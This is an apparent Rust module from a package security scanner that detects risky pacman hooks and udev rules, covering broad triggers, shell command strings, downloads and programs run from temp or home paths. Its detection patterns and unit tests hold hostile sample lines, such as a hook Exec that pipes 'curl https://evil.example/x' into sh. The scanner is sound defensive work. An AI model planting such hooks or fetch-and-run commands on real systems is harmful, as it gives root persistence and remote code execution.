//! Content checks for root-run files a package ships: libalpm hooks and udev
//! rules.
//!
//! Shipping a hook or a rule is normal (texinfo, icon caches, dkms, systemd,
//! every `uaccess` rule). What matters is what they RUN and when: a hook with a
//! trigger that matches every transaction runs as root each time pacman does
//! anything, and a udev rule can launch a program as root whenever a device
//! appears. Both are read from the package directory (the loader hands them
//! over as side scripts); this analyzer never looks inside `$pkgdir` text.

use super::SecurityAnalyzer;
use crate::error::Result;
use crate::types::{AnalysisContext, Category, Finding, Location, Severity};
use async_trait::async_trait;
use lazy_static::lazy_static;
use regex::Regex;

lazy_static! {
    /// Exec lines that fetch, or run from a world-writable or user-owned place.
    static ref HOOK_DANGEROUS: Regex = Regex::new(
        r"(?i)\b(?:curl|wget|aria2c)\b|/tmp/|/dev/shm|/var/tmp/|\$HOME|\$\{HOME\}|~/|/home/|/root/"
    )
    .unwrap();
    /// A shell running a command string.
    static ref SHELL_C: Regex =
        Regex::new(r"(?i)\b(?:ba|da|z|k|a)?sh\b\s+(?:-\w+\s+)*-\w*c\b").unwrap();
    /// A udev program-running assignment: RUN+= / RUN{program}+= / PROGRAM== / IMPORT{program}=.
    static ref UDEV_RUN: Regex = Regex::new(
        r#"(?i)\b(RUN(?:\{(\w+)\})?|PROGRAM|IMPORT\{program\})\s*(?:\+=|:=|==|=)\s*e?"([^"]*)""#
    )
    .unwrap();
}

lazy_static! {
    /// A line that is udev rule syntax: a match key compared to a quoted value.
    static ref UDEV_SNIFF: Regex = Regex::new(
        r#"(?im)^[^#\n]*\b(?:ACTION|SUBSYSTEMS?|KERNELS?|DRIVERS?|ATTRS?\{[^}]+\}|ENV\{[^}]+\}|TAG|SYMLINK)\s*[!=]=\s*"[^"\n]*""#
    )
    .unwrap();
    static ref HOOK_TRIGGER: Regex = Regex::new(r"(?im)^\s*\[Trigger\]").unwrap();
    static ref HOOK_ACTION: Regex = Regex::new(r"(?im)^\s*\[Action\]").unwrap();
}

lazy_static! {
    /// A path under a directory pacman or udev reads executable rules from.
    static ref RULE_DEST: Regex = Regex::new(
        r#"[^\s"'<>|;&]*(?:libalpm/hooks|pacman\.d/hooks|udev/rules\.d)/[^\s"'<>|;&]*"#
    )
    .unwrap();
    static ref QUOTED: Regex = Regex::new(r#"'([^']*)'|"((?:[^"\\]|\\.)*)""#).unwrap();
    static ref HEREDOC: Regex =
        Regex::new(r#"<<-?\s*(?:'([A-Za-z_]\w*)'|"([A-Za-z_]\w*)"|([A-Za-z_]\w*))"#).unwrap();
    static ref COPY_VERB: Regex = Regex::new(r"\b(?:install|cp|mv|ln|rsync)\b").unwrap();
    static ref GENERATE: Regex = Regex::new(r"\b(?:printf|echo|cat|tee|dd)\b|>").unwrap();
}

/// `\n` and `\t` escapes as printf and echo -e expand them.
fn unescape_printf(s: &str) -> String {
    s.replace("\\n", "\n").replace("\\t", "\t")
}

/// Look for hooks and udev rules a script writes out itself (printf, echo, cat,
/// tee, a heredoc) to a hooks or rules directory, judge the literal content,
/// and report content that cannot be read because it is built at run time.
/// Copies of existing files (`install`, `cp`) are not generated content and
/// are covered by the sidecar analysis.
fn analyze_generated(path: &std::path::Path, text: &str, out: &mut Vec<Finding>) {
    use std::collections::BTreeMap;
    // destination -> (first line, accumulated literal content, generated?)
    let mut dests: BTreeMap<String, (usize, String, bool)> = BTreeMap::new();
    let lines: Vec<&str> = text.lines().collect();
    let mut i = 0;
    while i < lines.len() {
        let line = lines[i];
        let t = line.trim_start();
        i += 1;
        if t.starts_with('#') {
            continue;
        }
        let Some(m) = RULE_DEST.find(line) else {
            continue;
        };
        let copy_only = COPY_VERB.is_match(line) && !line.contains("<<") && !line.contains('>');
        if copy_only || !GENERATE.is_match(line) {
            continue;
        }
        let key = m.as_str().to_string();
        let entry = dests.entry(key).or_insert((i, String::new(), false));
        entry.2 = true;
        // quoted literals on the line, one per output line (printf '%s\n' a b)
        let before_dest = &line[..m.start()];
        let after_dest = &line[m.end()..];
        for cap in QUOTED.captures_iter(&format!("{before_dest} {after_dest}")) {
            let lit = cap.get(1).or_else(|| cap.get(2)).map_or("", |m| m.as_str());
            entry.1.push_str(&unescape_printf(lit));
            entry.1.push('\n');
        }
        // heredoc body
        if let Some(h) = HEREDOC.captures(line) {
            let delim = h
                .get(1)
                .or_else(|| h.get(2))
                .or_else(|| h.get(3))
                .map_or("", |m| m.as_str())
                .to_string();
            while i < lines.len() {
                let body = lines[i];
                i += 1;
                if body.trim() == delim {
                    break;
                }
                entry.1.push_str(body);
                entry.1.push('\n');
            }
        }
    }
    for (dest, (line, content, generated)) in dests {
        if !generated {
            continue;
        }
        let before = out.len();
        let is_rules = dest.contains("udev/rules.d");
        if is_rules {
            if looks_like_udev(&content) {
                analyze_udev(path, &content, out);
            }
        } else if looks_like_hook(&content) {
            analyze_hook(path, &content, out);
        }
        let judged = if is_rules {
            looks_like_udev(&content)
        } else {
            looks_like_hook(&content)
        };
        for f in &mut out[before..] {
            f.location.line = Some(line);
        }
        if !judged {
            out.push(finding(
                "PERSIST-015",
                Severity::Medium,
                "Hook or udev rule content is generated at build time",
                format!(
                    "{} writes {dest} from content the scanner cannot read (built from variables or commands). A hook or rule runs as root, so its content was not reviewed.",
                    path.file_name().and_then(|n| n.to_str()).unwrap_or("script")
                ),
                path,
                line,
                lines.get(line - 1).copied().unwrap_or(""),
                "Ship the hook or rule as a plain file in source= so it can be reviewed.",
            ));
        }
    }
}

/// Text that is a libalpm hook, whatever its file is called.
fn looks_like_hook(text: &str) -> bool {
    HOOK_TRIGGER.is_match(text) && HOOK_ACTION.is_match(text)
}

/// Text that is (or embeds) udev rule syntax.
fn looks_like_udev(text: &str) -> bool {
    UDEV_SNIFF.is_match(text)
}

/// udev helpers and system tools whose use in a rule is routine.
const UDEV_ROUTINE: &[&str] = &[
    "systemctl",
    "nvidia-modprobe",
    "chmod",
    "chown",
    "chgrp",
    "setfacl",
    "modprobe",
    "udevadm",
    "logger",
    "kmod",
    "mknod",
    "mkdir",
    "ln",
    "rm",
    "blockdev",
    "hdparm",
    "loadkeys",
    "setfont",
    "touch",
];

/// Analyzer for shipped alpm hooks and udev rules.
pub struct ShippedAnalyzer;

impl ShippedAnalyzer {
    /// Create a new analyzer.
    pub fn new() -> Self {
        Self
    }
}

impl Default for ShippedAnalyzer {
    fn default() -> Self {
        Self::new()
    }
}

#[allow(clippy::too_many_arguments)]
fn finding(
    id: &str,
    severity: Severity,
    title: &str,
    description: String,
    file: &std::path::Path,
    line: usize,
    snippet: &str,
    recommendation: &str,
) -> Finding {
    Finding {
        id: id.to_string(),
        severity,
        category: Category::Persistence,
        title: title.to_string(),
        description,
        location: Location {
            file: file.to_path_buf(),
            line: Some(line),
            column: None,
            snippet: Some(snippet.trim().to_string()),
        },
        recommendation: recommendation.to_string(),
        cwe_id: Some("CWE-506".to_string()),
        metadata: serde_json::json!({ "matched_text": snippet.trim() }),
    }
}

/// One `[Trigger]` of a hook.
#[derive(Default)]
struct Trigger {
    types: Vec<String>,
    targets: Vec<String>,
}

/// A pattern made only of `*`, `?` and bracket classes, with at least one `*`.
fn glob_only(t: &str) -> bool {
    let mut stripped = String::new();
    let mut in_class = false;
    for c in t.chars() {
        match c {
            '[' => in_class = true,
            ']' if in_class => in_class = false,
            _ if in_class => {}
            _ => stripped.push(c),
        }
    }
    !in_class && stripped.contains('*') && stripped.chars().all(|c| matches!(c, '*' | '?'))
}

impl Trigger {
    /// Matches every package or every path: runs on any transaction.
    fn is_broad(&self) -> bool {
        let kind = self
            .types
            .iter()
            .any(|t| matches!(t.to_ascii_lowercase().as_str(), "package" | "path" | "file"));
        // `*`, `**`, `?*`, `[!x]*`...: nothing but glob syntax, at least one `*`
        kind && self.targets.iter().any(|t| glob_only(t))
    }
}

fn analyze_hook(path: &std::path::Path, content: &str, out: &mut Vec<Finding>) {
    let mut triggers: Vec<Trigger> = Vec::new();
    let mut section = String::new();
    let mut execs: Vec<(usize, String)> = Vec::new();
    for (i, raw) in content.lines().enumerate() {
        let line = raw.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            section = name.trim().to_ascii_lowercase();
            if section == "trigger" {
                triggers.push(Trigger::default());
            }
            continue;
        }
        let Some((k, v)) = line.split_once('=') else {
            continue;
        };
        let (k, v) = (k.trim().to_ascii_lowercase(), v.trim());
        match (section.as_str(), k.as_str()) {
            ("trigger", "type") => {
                if let Some(t) = triggers.last_mut() {
                    t.types.push(v.to_string());
                }
            }
            ("trigger", "target") => {
                if let Some(t) = triggers.last_mut() {
                    t.targets.push(v.to_string());
                }
            }
            ("action", "exec") => execs.push((i + 1, v.to_string())),
            _ => {}
        }
    }
    let broad = triggers.iter().any(Trigger::is_broad);
    let fname = path.file_name().and_then(|n| n.to_str()).unwrap_or("hook");

    for (line, exec) in &execs {
        let dangerous = HOOK_DANGEROUS.is_match(exec);
        let shell = SHELL_C.is_match(exec);
        if dangerous || (broad && shell) {
            out.push(finding(
                "PERSIST-012",
                Severity::High,
                "pacman hook runs a fetch, a shell command or a user/temp path",
                format!(
                    "{fname} is a libalpm hook (runs as root) whose Exec {}. {}",
                    if dangerous {
                        "downloads, or runs something from /tmp, /dev/shm or a home directory"
                    } else {
                        "runs a shell command string on every transaction"
                    },
                    "A hook like this is a root persistence mechanism."
                ),
                path,
                *line,
                &format!("Exec = {exec}"),
                "Do not install. A hook should run a fixed, packaged program with a narrow Target.",
            ));
        } else if broad {
            out.push(finding(
                "PERSIST-011",
                Severity::Medium,
                "pacman hook triggers on every transaction",
                format!(
                    "{fname} is a libalpm hook with Target = * (any package or path), so its Exec runs as root on every pacman transaction."
                ),
                path,
                *line,
                &format!("Exec = {exec}"),
                "Check that the hook needs to run for every package and that Exec is a program you trust.",
            ));
        }
    }
}

/// The program a udev assignment launches: first word of the value.
fn udev_program(value: &str) -> &str {
    value.split_whitespace().next().unwrap_or("")
}

fn udev_is_routine(prog: &str) -> bool {
    if prog.is_empty() || prog.starts_with('%') || prog.starts_with("$env") {
        return true;
    }
    if prog.starts_with("/usr/lib/udev/")
        || prog.starts_with("/lib/udev/")
        || prog.starts_with("/usr/lib/systemd/")
    {
        return true;
    }
    let base = prog.rsplit('/').next().unwrap_or(prog);
    let system_dir = prog.starts_with("/usr/bin/")
        || prog.starts_with("/bin/")
        || prog.starts_with("/usr/sbin/")
        || prog.starts_with("/sbin/")
        || !prog.contains('/');
    system_dir && UDEV_ROUTINE.contains(&base)
}

fn analyze_udev(path: &std::path::Path, content: &str, out: &mut Vec<Finding>) {
    // Splice backslash continuations so a long rule is one statement.
    let mut statements: Vec<(usize, String)> = Vec::new();
    let mut pending: Option<(usize, String)> = None;
    for (i, raw) in content.lines().enumerate() {
        let (start, mut acc) = pending.take().unwrap_or((i + 1, String::new()));
        let t = raw.trim_end();
        if let Some(cont) = t.strip_suffix('\\') {
            acc.push_str(cont);
            pending = Some((start, acc));
        } else {
            acc.push_str(t);
            statements.push((start, acc));
        }
    }
    if let Some(p) = pending {
        statements.push(p);
    }
    let fname = path.file_name().and_then(|n| n.to_str()).unwrap_or("rules");
    for (line, text) in statements {
        if text.trim_start().starts_with('#') {
            continue;
        }
        for cap in UDEV_RUN.captures_iter(&text) {
            // RUN{builtin} is udev's own code, not a program.
            if cap
                .get(2)
                .is_some_and(|m| m.as_str().eq_ignore_ascii_case("builtin"))
            {
                continue;
            }
            // PROGRAM== also runs the program, so every form is checked.
            let value = &cap[3];
            let prog = udev_program(value);
            let dangerous = HOOK_DANGEROUS.is_match(value);
            let shell = SHELL_C.is_match(value);
            if dangerous || shell {
                out.push(finding(
                    "PERSIST-014",
                    Severity::High,
                    "udev rule runs a shell command, a fetch or a user/temp path",
                    format!(
                        "{fname} is a udev rule (runs as root when a device appears) that runs `{}`, which {}.",
                        value.trim(),
                        if shell {
                            "executes a shell command string"
                        } else {
                            "downloads or runs from /tmp, /dev/shm or a home directory"
                        }
                    ),
                    path,
                    line,
                    value,
                    "Do not install. A udev rule should call a fixed, packaged program.",
                ));
            } else if !udev_is_routine(prog) {
                out.push(finding(
                    "PERSIST-013",
                    Severity::Medium,
                    "udev rule runs a package-shipped program",
                    format!(
                        "{fname} is a udev rule that launches `{prog}` as root whenever its device matches."
                    ),
                    path,
                    line,
                    value,
                    "Check the program the rule launches and that the match is narrow (specific vendor and product).",
                ));
            }
        }
    }
}

#[async_trait]
impl SecurityAnalyzer for ShippedAnalyzer {
    async fn analyze(&self, context: &AnalysisContext) -> Result<Vec<Finding>> {
        let mut findings = Vec::new();
        // Shipped files: judged by what they ARE, not what they are called. A
        // hook installed as `zz.hook` from a source named `zz.conf` is still a
        // hook.
        for script in context.all_scripts() {
            let ext = script.path.extension().and_then(|e| e.to_str());
            if ext == Some("hook") || looks_like_hook(&script.content) {
                analyze_hook(&script.path, &script.content, &mut findings);
            }
            if ext == Some("rules") || looks_like_udev(&script.content) {
                analyze_udev(&script.path, &script.content, &mut findings);
            }
        }
        // ...and a hook or rule written out by the PKGBUILD or a scriptlet
        // itself (a heredoc or printf into $pkgdir/.../hooks).
        let mut embedded: Vec<(&std::path::Path, &str)> = vec![(
            context.file_path.as_path(),
            context.pkgbuild.raw_content.as_str(),
        )];
        for s in context.all_scripts() {
            if s.path.extension().and_then(|e| e.to_str()) != Some("hook") {
                embedded.push((s.path.as_path(), s.content.as_str()));
            }
        }
        for (path, text) in embedded {
            if looks_like_hook(text) {
                analyze_hook(path, text, &mut findings);
            }
            if looks_like_udev(text) && path == context.file_path.as_path() {
                analyze_udev(path, text, &mut findings);
            }
        }
        // hooks and rules written out by printf/echo/cat/tee/heredoc
        analyze_generated(
            context.file_path.as_path(),
            &context.pkgbuild.raw_content,
            &mut findings,
        );
        for s in context.all_scripts() {
            if s.path.extension().and_then(|e| e.to_str()) != Some("hook") {
                analyze_generated(s.path.as_path(), &s.content, &mut findings);
            }
        }
        let mut seen = std::collections::HashSet::new();
        findings.retain(|f| seen.insert((f.id.clone(), f.location.file.clone(), f.location.line)));
        Ok(findings)
    }

    fn name(&self) -> &str {
        "shipped"
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::path::Path;

    fn hook(content: &str) -> Vec<String> {
        let mut out = Vec::new();
        analyze_hook(Path::new("x.hook"), content, &mut out);
        out.into_iter().map(|f| f.id).collect()
    }

    fn udev(content: &str) -> Vec<String> {
        let mut out = Vec::new();
        analyze_udev(Path::new("99-x.rules"), content, &mut out);
        out.into_iter().map(|f| f.id).collect()
    }

    const BROAD: &str = "[Trigger]\nOperation = Upgrade\nType = Package\nTarget = *\n[Action]\nWhen = PostTransaction\n";

    #[test]
    fn broad_hook_is_medium() {
        assert_eq!(
            hook(&format!("{BROAD}Exec = /usr/lib/demo/sync\n")),
            ["PERSIST-011"]
        );
    }

    #[test]
    fn broad_hook_with_shell_or_fetch_is_high() {
        assert_eq!(
            hook(&format!("{BROAD}Exec = /bin/sh -c 'x'\n")),
            ["PERSIST-012"]
        );
        assert_eq!(
            hook(&format!(
                "{BROAD}Exec = /usr/bin/curl http://evil.example/x\n"
            )),
            ["PERSIST-012"]
        );
        let narrow = "[Trigger]\nType = Package\nTarget = foo\n[Action]\nExec = /tmp/x\n";
        assert_eq!(hook(narrow), ["PERSIST-012"]);
    }

    #[test]
    fn narrow_hooks_are_clean() {
        let nvidia = "[Trigger]\nOperation = Install\nType = Package\nTarget = nvidia\nTarget = linux*\n[Action]\nDepends = mkinitcpio\nWhen = PostTransaction\nExec = /bin/sh -c 'while read -r t; do :; done; /usr/bin/mkinitcpio -P'\nNeedsTargets\n";
        assert!(hook(nvidia).is_empty());
        let texinfo = "[Trigger]\nType = Path\nOperation = Install\nTarget = usr/share/info/*\n[Action]\nWhen = PostTransaction\nExec = /usr/share/libalpm/scripts/texinfo-install\nNeedsTargets\n";
        assert!(hook(texinfo).is_empty());
    }

    #[test]
    fn udev_nonstandard_program_is_medium() {
        assert_eq!(
            udev("ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/usr/lib/demo/hook\"\n"),
            ["PERSIST-013"]
        );
    }

    #[test]
    fn udev_shell_or_fetch_is_high() {
        assert_eq!(
            udev("ACTION==\"add\", RUN+=\"/bin/sh -c 'id > /tmp/x'\"\n"),
            ["PERSIST-014"]
        );
        assert_eq!(
            udev("ACTION==\"add\", RUN+=\"/usr/bin/curl http://evil.example/x\"\n"),
            ["PERSIST-014"]
        );
        assert_eq!(
            udev("ACTION==\"add\", RUN+=\"/home/u/x\"\n"),
            ["PERSIST-014"]
        );
    }

    #[test]
    fn udev_nvidia_modprobe_is_routine_but_only_from_a_system_dir() {
        assert!(udev("RUN+=\"/usr/bin/nvidia-modprobe -c0 -u\"\n").is_empty());
        assert_eq!(
            udev("RUN+=\"/opt/x/nvidia-modprobe -c0\"\n"),
            ["PERSIST-013"]
        );
        assert_eq!(
            udev("RUN+=\"/opt/displaylink/udev.sh $root $devpath\"\n"),
            ["PERSIST-013"]
        );
    }

    #[test]
    fn udev_routine_rules_are_clean() {
        for r in [
            "SUBSYSTEM==\"usb\", ATTRS{idVendor}==\"1234\", TAG+=\"uaccess\"\n",
            "KERNEL==\"foo\", MODE=\"0660\", GROUP=\"plugdev\"\n",
            "ACTION==\"add\", RUN+=\"/usr/bin/chmod 660 /dev/foo\"\n",
            "ACTION==\"add\", RUN+=\"/usr/bin/systemctl start foo.service\"\n",
            "ACTION==\"add\", RUN+=\"/usr/bin/setfacl -m u:x:rw %N\"\n",
            "ACTION==\"add\", RUN+=\"/usr/bin/nvidia-modprobe -c0 -u\"\n",
            "ACTION==\"add\", RUN{builtin}=\"kmod load foo\"\n",
            "ACTION==\"add\", IMPORT{program}=\"/usr/lib/udev/ata_id --export $devnode\"\n",
            "# RUN+=\"/tmp/x\"\n",
        ] {
            assert!(udev(r).is_empty(), "{r}");
        }
    }

    #[test]
    fn glob_only_targets_are_broad() {
        for t in ["*", "**", "?*", "[!x]*"] {
            assert_eq!(
                hook(&format!("[Trigger]\nType = Package\nTarget = {t}\n[Action]\nExec = /usr/lib/demo/sync\n")),
                ["PERSIST-011"],
                "{t}"
            );
        }
        assert!(hook(
            "[Trigger]\nType = Package\nTarget = lib*\n[Action]\nExec = /usr/lib/demo/sync\n"
        )
        .is_empty());
        assert!(hook(
            "[Trigger]\nType = Package\nTarget = ?\n[Action]\nExec = /usr/lib/demo/sync\n"
        )
        .is_empty());
    }

    #[test]
    fn narrow_hook_that_fetches_through_a_shell_is_high() {
        let h = "[Trigger]\nType = Package\nTarget = foo\n[Action]\nExec = /bin/sh -c 'curl -s https://evil.example/x | sh'\n";
        assert_eq!(hook(h), ["PERSIST-012"]);
    }

    #[test]
    fn udev_escaped_string_prefix_is_read() {
        assert_eq!(
            udev("ACTION==\"add\", RUN+=e\"/bin/sh -c 'x'\"\n"),
            ["PERSIST-014"]
        );
        assert_eq!(
            udev("ACTION==\"add\", RUN+=e\"/usr/lib/demo/hook\"\n"),
            ["PERSIST-013"]
        );
    }

    #[test]
    fn content_decides_not_the_file_name() {
        assert!(looks_like_hook(
            "[Trigger]\nType = Package\nTarget = x\n[Action]\nExec = /tmp/x\n"
        ));
        assert!(!looks_like_hook("[Trigger]\nonly a trigger\n"));
        assert!(looks_like_udev(
            "ACTION==\"add\", SUBSYSTEM==\"usb\", RUN+=\"/x\"\n"
        ));
        assert!(!looks_like_udev("if [ \"$x\" == \"y\" ]; then :; fi\n"));
    }

    fn generated(text: &str) -> Vec<(String, Option<usize>)> {
        let mut out = Vec::new();
        analyze_generated(Path::new("PKGBUILD"), text, &mut out);
        out.into_iter().map(|f| (f.id, f.location.line)).collect()
    }

    #[test]
    fn printf_written_hooks_are_read() {
        let esc = "package() {\n  printf '[Trigger]\\nType = Package\\nTarget = *\\n[Action]\\nExec = /tmp/.x\\n' > \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"\n}\n";
        assert_eq!(generated(esc), [("PERSIST-012".to_string(), Some(2))]);
        let args = "  printf '%s\\n' '[Trigger]' 'Type = Package' 'Target = *' '[Action]' 'Exec = /tmp/.x' > \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"\n";
        assert_eq!(generated(args), [("PERSIST-012".to_string(), Some(1))]);
        let echo = "echo -e '[Trigger]\\nType = Package\\nTarget = x\\n[Action]\\nExec = /usr/bin/curl http://evil.example/x' | tee \"$pkgdir/etc/pacman.d/hooks/z.hook\"\n";
        assert_eq!(generated(echo), [("PERSIST-012".to_string(), Some(1))]);
    }

    #[test]
    fn heredoc_and_appended_hooks_are_read() {
        let hd = "cat > \"$pkgdir/usr/share/libalpm/hooks/zz.hook\" <<'EOF'\n[Trigger]\nType = Package\nTarget = *\n[Action]\nExec = /tmp/.x\nEOF\n";
        assert_eq!(generated(hd), [("PERSIST-012".to_string(), Some(1))]);
        let appended = "printf '[Trigger]\\nType = Package\\nTarget = x\\n' >> \"$pkgdir/usr/share/libalpm/hooks/a.hook\"\nprintf '[Action]\\nExec = /tmp/y\\n' >> \"$pkgdir/usr/share/libalpm/hooks/a.hook\"\n";
        assert_eq!(generated(appended).len(), 1);
        let udev = "printf 'ACTION==\"add\", RUN+=\"/bin/sh -c x\"\\n' > \"$pkgdir/usr/lib/udev/rules.d/90-x.rules\"\n";
        assert_eq!(generated(udev), [("PERSIST-014".to_string(), Some(1))]);
    }

    #[test]
    fn unreadable_generated_content_is_reported_and_copies_are_not() {
        assert_eq!(
            generated("echo \"$content\" > \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"\n"),
            [("PERSIST-015".to_string(), Some(1))]
        );
        assert_eq!(
            generated("$gen > \"$pkgdir/usr/lib/udev/rules.d/90-x.rules\"\n"),
            [("PERSIST-015".to_string(), Some(1))]
        );
        // copies of existing files, a harmless narrow hook, and mere mentions
        assert!(
            generated("install -Dm644 zz.hook \"$pkgdir/usr/share/libalpm/hooks/zz.hook\"\n")
                .is_empty()
        );
        assert!(generated("install -d \"$pkgdir/usr/share/libalpm/hooks\"\n").is_empty());
        assert!(generated("# printf x > /usr/share/libalpm/hooks/a.hook\n").is_empty());
        let ok = "printf '[Trigger]\\nType = Package\\nTarget = foo\\n[Action]\\nExec = /usr/bin/foo-hook\\n' > \"$pkgdir/usr/share/libalpm/hooks/foo.hook\"\n";
        assert!(generated(ok).is_empty());
    }
}
